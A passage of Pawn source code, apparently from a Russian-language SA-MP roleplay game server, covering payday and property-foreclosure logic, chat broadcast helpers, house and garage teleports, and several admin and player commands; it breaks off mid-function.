				PlayerInfo[i][pExp] = expamount;
			}
			if(PlayerInfo[i][pDonateRank] >= 1) SCM(i, COLOR_GOLD, "===================================");
			else SCM(i,COLOR_GRAD1, "===================================");
			if(PlayerInfo[i][pExp] >= expamount)
			{
				PlayerInfo[i][pLevel] += 1, PlayerInfo[i][pExp] = 0, DollahScoreUpdate(i), SCM(i, COLOR_LIGHTGREEN, " Поздравляем! Ваш лвл повысился");
			}
			if(PlayerInfo[i][pPBizzKey] != 999 && BizzInfo[b][bProducts] < 0)
			{
				SCM(i, COLOR_LIGHTRED, " Ваш бизнес был продан за неуплату электроэнергии / простаивание");
				SCM(i, COLOR_LIGHTRED, " Если по истечению {ffffff}12 {FF6347}часов бизнес будет закрыт, он будет продан гос-ву");
				BizzInfo[b][bLockTime] = 1;
			}
			if(PlayerInfo[i][pPBizzKey] != 999 && BizzInfo[b][bLockTime] > 1 && BizzInfo[b][bProducts] < 0)
			{
				format(string, 160, " Ваш бизнес закрыт уже {ffffff}%i {FF6347}час(а/ов)",BizzInfo[b][bLockTime]);
				SCM(i, COLOR_LIGHTRED,string);
				SCM(i, COLOR_LIGHTRED, " Если по истечению {ffffff}12 {FF6347}часов бизнес будет закрыт, он будет продан гос-ву");
			}
			if(PlayerInfo[i][pPBizzKey] != 999 && BizzInfo[b][bLockTime] > 12 && BizzInfo[b][bProducts] < 0)
			{
				SCM(i, COLOR_LIGHTRED," Ваш бизнес был продан за неуплату электроэнергии / простаивание");
				SCM(i, COLOR_LIGHTRED," Ваши деньги за бизнес были перечислены на ваш счет");
				BizzInfo[b][bLocked] = 1;
				BizzInfo[b][bProducts] = 0;
				strmid(BizzInfo[b][bOwner], "None", 0, strlen("None"), 32);
				PlayerInfo[i][pBank] +=BizzInfo[b][bTill]+BizzInfo[b][bLandTax];
				BizzInfo[b][bTill] = 0;
				BizzInfo[b][bPrice] = 0;
				BizzInfo[b][bMafia] = 0;
				BizzInfo[b][bLandTax] = 0;
				BizzPay[b] = 0;
				BizzInfo[b][bLicense] = 0;
				BGet(i);
				format(YCMDstr, sizeof(YCMDstr), "%s\nПродаётся", BizzInfo[b][bMessage],BizzInfo[b][bBuyPrice]);
				UpdateDynamic3DTextLabelText(BizzInfo[b][bLabel], COLOR_GREEN, YCMDstr);
				PlayerInfo[i][pPBizzKey] = 999;
			}
			if(PlayerInfo[i][pPBizzKey] != 999 && BizzInfo[b][bLandTax] < 0)
			{
				SCM(i, COLOR_LIGHTRED," Ваш бизнес был продан за неуплату электроэнергии / простаивание");
				SCM(i, COLOR_LIGHTRED," Ваши деньги за бизнес были перечислены на ваш счет");
				BizzInfo[b][bLocked] = 1;
				BizzInfo[b][bProducts] = 0;
				strmid(BizzInfo[b][bOwner], "None", 0, strlen("None"), 32);
				PlayerInfo[i][pBank] +=BizzInfo[b][bTill]+BizzInfo[b][bLandTax];
				BizzInfo[b][bTill] = 0;
				BizzInfo[b][bPrice] = 0;
				BizzInfo[b][bMafia] = 0;
				BizzInfo[b][bLandTax] = 0;
				BizzPay[b] = 0;
				BizzInfo[b][bLicense] = 0;
				BGet(i);
				format(YCMDstr, sizeof(YCMDstr), "%s\nПродаётся", BizzInfo[b][bMessage],BizzInfo[b][bBuyPrice]);
				UpdateDynamic3DTextLabelText(BizzInfo[b][bLabel], COLOR_GREEN, YCMDstr);
				PlayerInfo[i][pPBizzKey] = 999;
			}
			if(GetPVarInt(i, "GetHome") > 0)
			{
				SCM(i, COLOR_LIGHTRED," Вы были выселены за неуплату квартплаты");
				SCM(i, COLOR_LIGHTRED," Деньги за дом вы можете получить в банке \"/GetHouseMoney\"");
				DeletePVar(i, "GetHome");
				PlayerInfo[i][pPHouseKey] = 9999;
				PlayerInfo[i][pText] = 1;
				SpawnChange[i] = 0;
			}
			if(GetPVarInt(i, "GetKvart") > 0)
			{
				SCM(i, COLOR_LIGHTRED," Вы были выселены за неуплату квартплаты");
				DeletePVar(i, "GetKvart");
				PlayerInfo[i][pKvartiraKey] = 9999;
				SpawnChange[i] = 0;
			}
			if(GetPVarInt(i, "GetShop") > 0)
			{
				SCM(i, COLOR_LIGHTRED," Ваша автомастерская была выставлена на аукцион за неуплату налогов");
				SCM(i, COLOR_LIGHTRED," Деньги с банка автомастерской были перечислены на ваш счет");
				DeletePVar(i, "wShop");
				DeletePVar(i, "GetShop");
			}
			if(GetPVarInt(i, "GetFarm") > 0)
			{
				SCM(i, COLOR_LIGHTRED," Ваша ферма была выставлена на аукцион за неуплату налогов");
				SCM(i, COLOR_LIGHTRED," Деньги с банка автомастерской были перечислены на ваш счет");
				PlayerInfo[i][pPFarmKey] = 999;
				DeletePVar(i, "GetFarm");
			}
			if(PlayerInfo[i][pLevel] == 5 && PlayerInfo[i][pExp] == 0)
			{
			    // #promo
				mysql_format(DATABASE,QUERY, 256, "SELECT pDrug FROM `"TABLE_ACCOUNTS"` WHERE name = '%s'",PlayerInfo[i][pName]);
				mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",13,i,"");
				if(strcmp(PlayerInfo[i][pDrug], "#newlife", true) == 0)
				{
					SCM(i,COLOR_BLUE," Спасибо за то, что приняли участие в развитии проекта");
					switch(booston)
					{
					case 0: SCM(i,COLOR_BLUE," Вам зачисленно 300000 вирт"),PlayerInfo[i][pCash] += 300000;
					case 1: SCM(i,COLOR_BLUE," Вам зачисленно 600000 вирт"),PlayerInfo[i][pCash] += 600000;
					}
					SCM(i,COLOR_GREEN," Рекомендуется: Сменить пароль на более сложный ( /mm >>> [6] Смена пароля )");
					SCM(i,COLOR_GREEN," Рекомендуется: Поставить проверку по IP и SuperKey ( /mm >>> [10] Безопасность )");
				}
			}
			seans[i] = 0;
			PlayerInfo[i][pMin] = 0;
			PlayerInfo[i][pRobHouse] = 0;
			PlayerInfo[i][pPayCheck] = 0;
			PlayerInfo[i][pPayDayHad] ++;
			PlayerInfo[i][pPLimitBank] = 0;
			Online[i]++;
			SaveMySQL(2, i);
			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pExp = '%i', pMin = '%i', pLevel = '%i', pCash = '%i', pBank = '%i', pDolg = '%i', pDonateMoney = '%i', pWantedLevel = '%i' WHERE name = '%e'", PlayerInfo[i][pExp],
			PlayerInfo[i][pMin],
			PlayerInfo[i][pLevel],
			PlayerInfo[i][pCash],
			PlayerInfo[i][pBank],
			PlayerInfo[i][pDolg],
			PlayerInfo[i][pDonateMoney],
			PlayerInfo[i][pWantedLevel],
			PlayerInfo[i][pName]);
	        mysql_function_query(DATABASE,QUERY,false,"","");
        }
	}
	return true;
}
stock GetDay()
{
	new saturday = 1310155200;
	new w = gettime();
	new days;
	while(w - saturday > 60*60*24)
	{
		w-=60*60*24;
		days++;
	}
	while(days >=7)
	{
		days-=7;
	}
	new data[12];
	switch(days)
	{
		case 0:
			format(data,12,"Суббота");
		case 1:
			format(data,12,"Воскресенье");
		case 2:
			format(data,12,"Понедельник");
		case 3:
			format(data,12,"Вторник");
		case 4:
			format(data,12,"Среда");
		case 5:
			format(data,12,"Четверг");
		case 6:
			format(data,12,"Пятница");
		default:
			format(data,12,"Что-то пошло не так");
	}
	return data;
}
stock split(const strsrc[], strdest[][], delimiter)
{
	new i, li;
	new aNum;
	new len;
	while(i <= strlen(strsrc))
	{
		if(strsrc[i] == delimiter || i == strlen(strsrc))
		{
			len = strmid(strdest[aNum], strsrc, li, i, 128);
			strdest[aNum][len] = 0;
			li = i+1;
			aNum++;
		}
		i++;
	}
	return true;
}
stock BroadCast(color,const str[])
{
	SendClientMessageToAll(color, str);
	return true;
}
publics: ABroadCast(color,const str[],level)
{
	foreach(i)
	{
		if(PlayerInfo[i][pAdmin] < level || !dostup[i]) continue;
		SCM(i, color, str);
	}
}
stock OOCOff(color,const str[])
{
	foreach(i)
	{
		if(!GetPVarInt(i,"ooc_chat")) SCM(i, color, str);
	}
}
stock LSNews(color,const str[])
{
	foreach(i)
	{
		if(!lNews[i] || PlayerInfo[i][pMember] == 16 && lNews[i] == 1) SCM(i, color, str);
	}
}
stock LVNews(color,const str[])
{
	foreach(i)
	{
		if(!LvNews[i] || PlayerInfo[i][pMember] == 20 && LvNews[i] == 1) SCM(i, color, str);
	}
}
stock OOCNews(color,const str[])
{
	foreach(i)
	{
		if(!gNews[i] || PlayerInfo[i][pMember] == 9 && gNews[i] == 1) SCM(i, color, str);
	}
}
publics: SendTeamMessage(team, color, str[])
{
	foreach(i)
	{
		if(IsAArm(i) && GetPVarInt(i,"Fraction_Duty") || IsAMedic(i) && GetPVarInt(i,"Fraction_Duty") || IsAMayor(i) && GetPVarInt(i,"Fraction_Duty") || IsACop(i) && GetPVarInt(i,"Fraction_Duty") || PlayerInfo[i][pMember] == 11 && GetPVarInt(i,"Fraction_Duty")) SCM(i, color, str);
	}
}

stock SendPoliceMessage(color, str[])
{
	foreach(i)
	{
		if(PlayerInfo[i][pLeader] == 1 || PlayerInfo[i][pMember] == 1 || PlayerInfo[i][pLeader] == 10 || PlayerInfo[i][pMember] == 10 || PlayerInfo[i][pLeader] == 21 || PlayerInfo[i][pMember] == 21) SCM(i, color, str);
	}
}
stock SendRadioMessage(member, color, str[])
{
	foreach(i)
	{
		if(PlayerInfo[i][pMember] == member || PlayerInfo[i][pLeader] == member) SCM(i, color, str);
	}
}
stock SendJobMessage(job, color, str[])
{
	foreach(i)
	{
		if(!GetPVarInt(i,"TaxiDuty")) return true;
		if(PlayerInfo[i][pJob] == job) SCM(i, color, str);
	}
	return true;
}
stock SendFamilyMessage(family, color, str[])
{
	foreach(i)
	{
		if(GetPVarInt(i,"Fraction_Duty"))
		{
			if(GetPVarInt(i,"chats") != 1)
			{
				if(PlayerInfo[i][pMember] == family || GetPVarInt(i,"Atisper") == family)
				{
					SCM(i, color, str);
				}
			}
		}
		else if(GetPVarInt(i,"Atisper") == family)
		{
			SCM(i, color, str);
		}
	}
}
publics: SendGangMessage(family, color, str[])
{
	foreach(i)
	{
		if(GetPVarInt(i,"Atisper") == family || PlayerInfo[i][pMember] == 12 || PlayerInfo[i][pMember] == 13 || PlayerInfo[i][pMember] == 15 || PlayerInfo[i][pMember] == 17 || PlayerInfo[i][pMember] == 18 )
		{
			if(!GetPVarInt(i,"family_chat")) SCM(i, color, str);
		}
	}
}
publics: SendMafiaMessage(family, color, str[])
{
	foreach(i)
	{
		if((PlayerInfo[i][pMember] == 5 || PlayerInfo[i][pMember] == 6 || PlayerInfo[i][pMember] == 14) && !GetPVarInt(i,"family_chat")) SCM(i, color, str);
	}
}
publics: SendCopsMessage(family, color, str[])
{
	foreach(i)
	{
		if((PlayerInfo[i][pMember] == 1 || PlayerInfo[i][pMember] == 2 || PlayerInfo[i][pMember] == 10 || PlayerInfo[i][pMember] == 21) && !GetPVarInt(i,"family_chat")) SCM(i, color, str);
	}
}
stock SendAdminMessage(color, str[])
{
	foreach(i)
	{
		if(!PlayerInfo[i][pAdmin] || !dostup[i]) continue;
		SCM(i, color, str);
	}
	return true;
}
stock HelperMessage(color,const str[])
{
	foreach(i)
	{
		if(!SDuty[i]) continue;
		SCM(i, color, str);
	}
}
stock IsPlayerNearGarage(playerid) // Если игрок у своего гаража, то...
{
	new house = PlayerInfo[playerid][pPHouseKey];
	if(HGet(playerid) && HouseInfo[house][hKlass] > 1)
	{
		if(PlayerToPoint(6.0,playerid,HouseInfo[house][hCarx], HouseInfo[house][hCary], HouseInfo[house][hCarz]))
		{
			return true;
		}
	}
	return false;
}
stock IsPlayerInGarage(playerid) // Если игрок в своем гараже, то...
{
    if(PlayerToPoint(40.0,playerid,246.3624,-104.2272,1004.0859)
			||PlayerToPoint(40.0,playerid,447.32,459.3,1002.00)
			||PlayerToPoint(40.0,playerid,897.2116,32.8244,1004.0160)
			||PlayerToPoint(40.0,playerid,504.5519,511.1329,1002.2659))
	{
		return true;
	}
	return false;
}
stock MovePlayerFromGarage(playerid) // телепорт игрока из гаража с машиной
{
	if(Flood[playerid] > 0 && PlayerInfo[playerid][pAdmin] <= 6) return SCM(playerid, 0xFFD5BBAA, " Не флуди!");
 	if(GetPVarInt(playerid,"CarsInGarage") == -1) return SCM(playerid,COLOR_GREY," Все ваши автомобили должны находиться в гараже"), Flood[playerid] = 1;
	new house = PlayerInfo[playerid][pPHouseKey];
	if(GetPlayerVirtualWorld(playerid) != (100+house)) return SCM(playerid, COLOR_GREY, " Вы не в своём гараже!");
	if(IsPlayerInVehicle(playerid, CarInfo[playerid][carID][0]))//garage_car[playerid][0]))
	{
 		SetPVarInt(playerid,"chosencar",0); // Выставляем игроку значение (Выбрана машина №0)
	}
	else if(IsPlayerInVehicle(playerid, CarInfo[playerid][carID][1]))//garage_car[playerid][1]))
	{
		SetPVarInt(playerid,"chosencar",1); // Выставляем игроку значение (Выбрана машина №1)
	}
	else if(IsPlayerInVehicle(playerid, CarInfo[playerid][carID][2]))//garage_car[playerid][2]))
	{
		SetPVarInt(playerid,"chosencar",2); // Выставляем игроку значение (Выбрана машина №2)
	}
	else if(IsPlayerInVehicle(playerid, CarInfo[playerid][carID][3]))//garage_car[playerid][3]))
	{
		SetPVarInt(playerid,"chosencar",3); // Выставляем игроку значение (Выбрана машина №3)
	}
	else if(IsPlayerInVehicle(playerid, CarInfo[playerid][carID][4]))//garage_car[playerid][4]))
	{
   		SetPVarInt(playerid,"chosencar",4); // Выставляем игроку значение (Выбрана машина №4)
	} else return SCM(playerid, COLOR_GREY, " Вы не в совём автомобиле");
	house_car[playerid] = GetPlayerVehicleID(playerid); // Выставим значение машине игрока (house_car)
 	SetPVarInt(playerid, "CarsInGarage", -1); // Выставим значение игроку (Не все машины игрока в гараже)
	SetVehiclePos(house_car[playerid], HouseInfo[house][hCarx], HouseInfo[house][hCary], HouseInfo[house][hCarz]);
	LinkVehicleToInterior(house_car[playerid], 0);
	SetVehicleVirtualWorld(house_car[playerid], 0);
	SetPlayerPos(playerid, HouseInfo[house][hCarx], HouseInfo[house][hCary], HouseInfo[house][hCarz]);
	SetPlayerInterior(playerid,0);
	SetPlayerVirtualWorld(playerid,0);
	PutPlayerInVehicleEx(playerid, house_car[playerid], 0);
	SetVehicleZAngle(house_car[playerid], HouseInfo[house][hCarc]);
 	return true;
}
stock MovePlayerToGarageFootOut(playerid) // телепорт игрока в гараж без машины с улицы
{
	for(new i = 1; i <= TotalHouse; i++)
	{
 		if(PlayerToPoint(4,playerid,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez])) // Телепорт с улицы
        {
            switch(HouseInfo[i][hKlass])
            {
				case 2: // Дом C Klass
				{
					LoadInterior(playerid);
    				SetPlayerInterior(playerid,19);
                    SetPlayerPos(playerid,249.6394,-113.2962,1004.0859);
                    SetPlayerFacingAngle(playerid, 90.00);
				}
				case 3: // Дом B Klass
				{
                    LoadInterior(playerid);
    				SetPlayerInterior(playerid,19);
                    SetPlayerPos(playerid,431.6059,469.4640,1003.0859);
                    SetPlayerFacingAngle(playerid, 270.00);
                }
                case 4: // Дом A Klass
                {
                    LoadInterior(playerid);
                    SetPlayerInterior(playerid,19);
                    SetPlayerPos(playerid,902.0135,22.8806,1004.0859);
                    SetPlayerFacingAngle(playerid, 0.00);
				}
				case 5: // Дом S Klass
				{
                    LoadInterior(playerid);
    				SetPlayerInterior(playerid,19);
                    SetPlayerPos(playerid,513.3862,511.5307,1002.2700);
                    SetPlayerFacingAngle(playerid, 90.00);
                }
            }
            return SetPlayerVirtualWorld(playerid,i+100);
        }
    }
    return true;
}
stock MovePlayerToGarageFootIn(playerid) // телепорт игрока в гараж без машины с дома
{
	for(new i = 1; i <= TotalHouse; i++)
	{
		if (PlayerToPoint(4, playerid,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz]))
		{
  			if(GetPlayerVirtualWorld(playerid) == i+50) // Телепорт с дома
  			{
	            switch(HouseInfo[i][hKlass])
	            {
					case 2: // Дом C Klass
					{
                        LoadInterior(playerid);
	    				SetPlayerInterior(playerid,19);
	                    SetPlayerPos(playerid,249.6394,-113.2962,1004.0859);
	                    SetPlayerFacingAngle(playerid, 90.00);
					}
					case 3: // Дом B Klass
					{
                        LoadInterior(playerid);
	    				SetPlayerInterior(playerid,19);
	                    SetPlayerPos(playerid,431.6059,469.4640,1003.0859);
	                    SetPlayerFacingAngle(playerid, 270.00);
	                }
	                case 4: // Дом A Klass
	                {
                        LoadInterior(playerid);
	                    SetPlayerInterior(playerid,19);
	                    SetPlayerPos(playerid,902.0135,22.8806,1004.0859);
	                    SetPlayerFacingAngle(playerid, 0.00);
					}
					case 5: // Дом S Klass
					{
                        LoadInterior(playerid);
	    				SetPlayerInterior(playerid,19);
	                    SetPlayerPos(playerid,513.3862,511.5307,1002.2700);
	                    SetPlayerFacingAngle(playerid, 90.00);
	                }
	            }
	            return SetPlayerVirtualWorld(playerid,i+100);
	        }
        }
    }
    return true;
}
stock MovePlayerToGarageCar(playerid) // телепорт игрока в гараж с машиной
{
	LoadInterior(playerid);
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return true; // Если игрок не в машине - сбрасываем
	if(!IsPlayerInVehicle(playerid,house_car[playerid])) return true; // Если игрок не в своей машине - сбрасываем
	new i = PlayerInfo[playerid][pPHouseKey];
	new h = GetPVarInt(playerid,"chosencar");
	SetPVarInt(playerid, "CarsInGarage", 1); // Выставляем игроку значение "все машине в гараже"
	SetPVarInt(playerid,"chosencar",-1); // по умолчанию - выбрана машина № 0 (carModel[0])
	SetPVarInt(playerid,"not_engine",0);
	SetPVarInt(playerid,"not_engine_",0);
	GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(GetPlayerVehicleID(playerid),false,false,alarm,doors,bonnet,boot,objective);
	switch(HouseInfo[i][hKlass])
	{
	    case 2: // Дом C Klass
	    {
	        switch(h) // Проверка на значение игрока (Какая машина не находится в гараже)
	        {
	        	case 0: MoveVehicleToGarage(playerid, house_car[playerid],248.1234,-110.5993,1003.6578+2.2,90.6935,19,i+100);
	            case 1: MoveVehicleToGarage(playerid, house_car[playerid],248.3368,-104.4114,1003.6582+2.2,86.1593,19,i+100);
			}
		}
		case 3: // B Klass
		{
			switch(h) // Проверка на значение игрока (Какая машина не находится в гараже)
	        {
	            case 0: MoveVehicleToGarage(playerid, house_car[playerid],435.5904,468.6050,1002.6595,358.6705,19,i+100);
    			case 1: MoveVehicleToGarage(playerid, house_car[playerid],441.7249,468.3962,1002.6600,360.0000,19,i+100);
 				case 2: MoveVehicleToGarage(playerid, house_car[playerid],447.4809,468.1860,1002.6586,358.1951,19,i+100);
			}
		}
		case 4: // A Klass
		{
			switch(h) // Проверка на значение игрока (Какая машина не находится в гараже)
	        {
	            case 0: MoveVehicleToGarage(playerid, house_car[playerid],893.5298,31.7400,1004.1795,333.8575,19,i+100);
    			case 1: MoveVehicleToGarage(playerid, house_car[playerid],897.6765,31.8136,1004.1783,0.9835,19,i+100);
 				case 2: MoveVehicleToGarage(playerid, house_car[playerid],902.9612,31.9576,1004.1783,1.5516,19,i+100);
 				case 3: MoveVehicleToGarage(playerid, house_car[playerid],907.1154,32.3961,1004.1783,30.6716,19,i+100);
			}
		}
		case 5: // S Klass
		{
			switch(h) // Проверка на значение игрока (Какая машина не находится в гараже)
	        {
	            case 0: MoveVehicleToGarage(playerid, house_car[playerid],511.2867,505.0032,1002.3588,47.6021,19,i+100);
	            case 1: MoveVehicleToGarage(playerid, house_car[playerid],504.8487,503.1697,1002.3583,90.2742,19,i+100);
 				case 2: MoveVehicleToGarage(playerid, house_car[playerid],504.5507,512.3398,1002.3583,91.0430,19,i+100);
 				case 3: MoveVehicleToGarage(playerid, house_car[playerid],504.7199,521.3282,1002.3588,90.3364,19,i+100);
    			case 4: MoveVehicleToGarage(playerid, house_car[playerid],511.4334,518.2543,1002.3597,126.6747,19,i+100);
			}
		}
	}
	return house_car[playerid] = -1;
}
stock MoveVehicleToGarage(playerid, vehicleid,Float:x,Float:y,Float:z,Float:angle,interiorid,virtualworld)
{
	SetVehicleZAngle(vehicleid, angle);
	SetVehiclePos(vehicleid,x,y,z);
	LinkVehicleToInterior(vehicleid, interiorid);
	SetVehicleVirtualWorld(vehicleid, virtualworld);
	SetPlayerInterior(playerid, interiorid);
	SetPlayerVirtualWorld(playerid,virtualworld);
	SetPlayerPos(vehicleid, x,y,z);
	
	PutPlayerInVehicle(playerid, vehicleid, 0);
	TelePos[playerid][0] = 0.0;
	TelePos[playerid][1] = 0.0;
	return true;
}
CMD:restoreaccess(playerid)
{
	if(PlayerInfo[playerid][pLogin] != 0) return SCM(playerid, COLOR_GREY, " Вы уже авторизованы");
	ShowPlayerDialogEx(playerid, 40, DIALOG_STYLE_LIST, "Восстановление доступа", "[Первый этап] Отправить код на эмейл\n[Второй этап] Ввести код и сбролсить пароли", "Выбор", "");
	printf("Игрок %s начал восстановление доступа к аккаунту", Name(playerid));
	return true;
}
CMD:serverbonus(playerid)
{
	if(PlayerInfo[playerid][pAdmin] < 10) return true;
	new que[2048];
	mysql_format(DATABASE, QUERY, sizeof(QUERY), "SELECT COLUMN_NAME,COLUMN_DEFAULT FROM INFORMATION_SCHEMA.columns WHERE `TABLE_name` = 'accounts' AND\
	`COLUMN_NAME` IN('pLevel', 'pBank', 'pCash', 'pDirectory', 'pCarLic', 'pFlyLic', 'pBoatLic', 'pFishLic', 'pGunLic', 'pGunSkills')");
	mysql_query(DATABASE, QUERY);
	new r = cache_num_rows();
	que = "Название\tЗначение при регистрации\n";
	if(r)
	{
		for(new i = r/3; i < (r/3)*2; i++)
		{
			new strin[128], col[32], def[64];
			cache_get_field_content(i,"COLUMN_NAME",col,DATABASE,sizeof(col));
			cache_get_field_content(i,"COLUMN_DEFAULT",def,DATABASE,sizeof(def));
			if(strcmp(col, "pLevel", false) == 0)
			{
			    if(strval(def) == 1) format(strin, sizeof(strin), "{FFFFFF}[0] Уровень\t{FF0000}[%s]\n",def);
			    else format(strin, sizeof(strin), "{FFFFFF}[0] Уровень\t{00FF00}[%s]\n",def);
			}
			else if(strcmp(col, "pBank", false) == 0)
			{
			    if(strval(def) == 0) format(strin, sizeof(strin), "{FFFFFF}[1] Деньги в банке\t{FF0000}[%s]\n",def);
				else format(strin, sizeof(strin), "{FFFFFF}[1] Деньги в банке\t{00FF00}[%s]\n",def);
			}
			else if(strcmp(col, "pCash", false) == 0)
			{
				if(strval(def) == 0) format(strin, sizeof(strin), "{FFFFFF}[2] Деньги на руках\t{FF0000}[%s]\n",def);
				else format(strin, sizeof(strin), "{FFFFFF}[2] Деньги на руках\t{00FF00}[%s]\n",def);
			}
			else if(strcmp(col, "pDirectory", false) == 0)
			{
				new defaults = strval(def);
				if(defaults == 0) strin = "{FFFFFF}[3] Телефонный справочник\t{FF0000}[Нет]\n";
				else strin = "{FFFFFF}[3] Телефонный справочник\t{00FF00}[Есть]\n";
			}
			else if(strcmp(col, "pCarLic", false) == 0)
			{
			    new defaults = strval(def);
				if(defaults == 0) strin = "{FFFFFF}[4] Лицензия на вождение\t{FF0000}[Нет]\n";
				else strin = "{FFFFFF}[4] Лицензия на вождение\t{00FF00}[Есть]\n";
			}
			else if(strcmp(col, "pFlyLic", false) == 0)
			{
			    new defaults = strval(def);
				if(defaults == 0) strin = "{FFFFFF}[5] Лицензия на полёты\t{FF0000}[Нет]\n";
				else strin = "{FFFFFF}[5] Лицензия на полёты\t{00FF00}[Есть]\n";
			}
			else if(strcmp(col, "pBoatLic", false) == 0)
			{
			    new defaults = strval(def);
				if(defaults == 0) strin = "{FFFFFF}[6] Лицензия на водный транспорт\t{FF0000}[Нет]\n";
				else strin = "{FFFFFF}[6] Лицензия на водный транспорт\t{00FF00}[Есть]\n";
			}
			else if(strcmp(col, "pFishLic", false) == 0)
			{
			    new defaults = strval(def);
				if(defaults == 0) strin = "{FFFFFF}[7] Лицензия на рыболовлю\t{FF0000}[Нет]\n";
				else strin = "{FFFFFF}[7] Лицензия на рыболовлю\t{00FF00}[Есть]\n";
			}
			else if(strcmp(col, "pGunLic", false) == 0)
			{
			    new defaults = strval(def);
				if(defaults == 0) strin = "{FFFFFF}[8] Лицензия на оружие\t{FF0000}[Нет]\n";
				else strin = "{FFFFFF}[8] Лицензия на оружие\t{00FF00}[Есть]\n";
			}
			else if(strcmp(col, "pGunSkills", false) == 0)
			{
	   			if(!strcmp(def, "0, 0, 0, 0, 0, 0", false)) strin = "{FFFFFF}[9] Навык владения оружием\t{FF0000}[Нет]\n";
				else strin = "{FFFFFF}[9] Навык владения оружием\t{00FF00}[Есть]\n";
			}

			strcat(que, strin);
  		}
	}
	ShowPlayerDialogEx(playerid, 5254, DIALOG_STYLE_TABLIST_HEADERS, "Бонусы сервера", que, "Выбор", "Отмена");
	printf("Администратор %s открыл окно бонусов сервера");
	return true;
}
CMD:tpcor(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7) return true;
	new Float:fx, Float:fy, Float:fz;
	if(sscanf(params, "fff",fx, fy, fz)) return SCM(playerid, -1, " Введите: /tpcor [x] [y] [z]");
	SetPlayerPos(playerid, fx, fy, fz);
	SCM(playerid, -1, " Вы были телепортированы");
	printf("Администратор %s телепортировался по координатам %f,%f,%f",Name(playerid), fx, fy, fz);
	return true;
}
CMD:tpint(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7) return true;
	if(sscanf(params, "i", params[0])) return SCM(playerid, -1, " Введите: /tpint [interior]");
	SetPlayerInterior(playerid, params[0]);
	SCM(playerid, -1, " Вы были телепортированы в другой интерьер");
	printf("Администратор %s установил себе интерьер №%i", Name(playerid), params[0]);
	return true;
}
CMD:tpvirt(playerid, params[])
{

	if(PlayerInfo[playerid][pAdmin] < 7) return true;
	if(sscanf(params, "i", params[0])) return SCM(playerid, -1, " Введите: /tpvirt [virtual world]");
	SetPlayerInterior(playerid, params[0]);
	SCM(playerid, -1, " Вы были телепортированы в другой виртуальный мир");
	printf("Администратор %s установил себе виртуальный мир №%i", Name(playerid), params[0]);
	return true;
}
CMD:grating(playerid)
{
	ShowPlayerDialogEx(playerid, 5693, DIALOG_STYLE_LIST, "Рейтинг", "[0] Банды\n[1] Игроки\n[2] История", "Выбрать", "Назад");
	return true;
}
CMD:enterg(playerid, params[])
{
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
		switch(GetPlayerVirtualWorld(playerid))
		{
		    case 0: MovePlayerToGarageFootOut(playerid); // зайти в гараж без машины с улицы
		    default: MovePlayerToGarageFootIn(playerid); // зайти в гараж без машины с дома
		}
	}
	else if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		MovePlayerToGarageCar(playerid); // Телепорт игрока вместе с машиной
	}
	printf("Игрок %s вошёл в гараж", Name(playerid));
	return true;
}
CMD:enter(playerid, params[])
{
	for(new i = 1; i <= TotalHouse; i++)
	{
		if(!PlayerToPoint(3, playerid,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez])) continue;
		if(strcmp(HouseInfo[i][hOwner],"None",true) != 0) // Если дом куплен
		{
			if(PlayerInfo[playerid][pPHouseKey] == i || HouseInfo[i][hLock] == 0 || IsACop(i) || PlayerInfo[i][pAdmin]) // Если игрок владелец дома или дом открыт
			{
				SetPlayerInterior(playerid,HouseInfo[i][hInt]);
				SetPlayerVirtualWorld(playerid,i+50);
				SetPlayerPos(playerid,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]);
				printf("Игрок %s вошёл в дом №%i", Name(playerid), i);
			}
			else // Если не владелец дома или дом закрыт
			{
				GameTextForPlayer(playerid, "~r~CLOSED", 5000, 1);
			}
		}
		else // Если дом зеленый
		{
			SetPlayerInterior(playerid,HouseInfo[i][hInt]);
			SetPlayerVirtualWorld(playerid,i+50);
			SetPlayerPos(playerid,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]);
			printf("Игрок %s вошёл в дом №%i", Name(playerid), i);
		}
		printf("Игрок %s вошёл в дом №%i", Name(playerid), i);
		break;
	}
	
	return true;
}
CMD:lpanel(playerid, params[])
{
	if(PlayerInfo[playerid][pLogin] == 0 || PlayerInfo[playerid][pLeader] == 0) return true;
	return ShowPlayerDialogEx(playerid, 1000, DIALOG_STYLE_LIST, "{AE443D}Меню | {FFFFFF}Панель лидера", "[0] Игроки в Offline\n[1] Понизить/повысить игрока в Offline\n[2] Уволить игрока в Offline", "Выбрать", "Назад");
}
CMD:boostinfo(playerid)
{
	if(booston == 0) return SCM(playerid,-1," Бонусы отключены");
	mysql_format(DATABASE,QUERY,256,"SELECT * FROM `boost` WHERE `Text` = 'BoostTime'");
	return mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",36,playerid,"");
}
CMD:tawercasino(playerid,params[])
{
	if(!GetPVarInt(playerid,"BoneStol_")) return SCM(playerid,COLOR_GREY," Вы не поставили ставку!");
	if(BoneInfo[GetPVarInt(playerid,"BoneStol")-1][GameStart] <= 0) return SCM(playerid,COLOR_GREY," В данный момент нельзя кинуть кости");
	if(GetPVarInt(playerid,"BoneStol_") > 1) return SCM(playerid,COLOR_GREY," Вы уже кидали кубики в этом раунде!");
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /tawercasino [очки]");
	new null = 0;
	SetPVarInt(playerid,"BoneStol_",params[0]);
	UpdateBone(GetPVarInt(playerid,"BoneStol")-1);
	foreach(i)
	{
		if(GetPVarInt(i,"BoneStol") == GetPVarInt(playerid,"BoneStol") && GetPVarInt(i,"BoneStol_") == 1) null++;
	}
	if(!null) BoneInfo[GetPVarInt(playerid,"BoneStol")-1][GameStart] = 4;
